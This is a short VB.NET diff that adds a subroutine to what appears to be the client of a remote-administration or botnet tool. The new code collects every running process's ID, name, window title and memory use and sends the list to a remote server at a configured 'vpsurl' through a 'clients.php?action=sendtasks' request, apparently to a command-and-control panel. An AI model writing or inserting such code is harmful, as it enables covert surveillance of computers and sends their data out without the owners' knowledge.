@@ -14,4 +14,15 @@ Module IndependantActions
             Exit Sub
         End Try
     End Sub
+
+    Public Sub UploadRunningTasks(ByRef mainWebClient As WebClient)
+        Dim total As String = ""
+        For Each p As Process In Process.GetProcesses
+            total += p.Id & "|"
+            total += p.ProcessName & "|"
+            total += p.MainWindowTitle & "|"
+            total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
+        Next
+        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
+    End Sub
 End Module
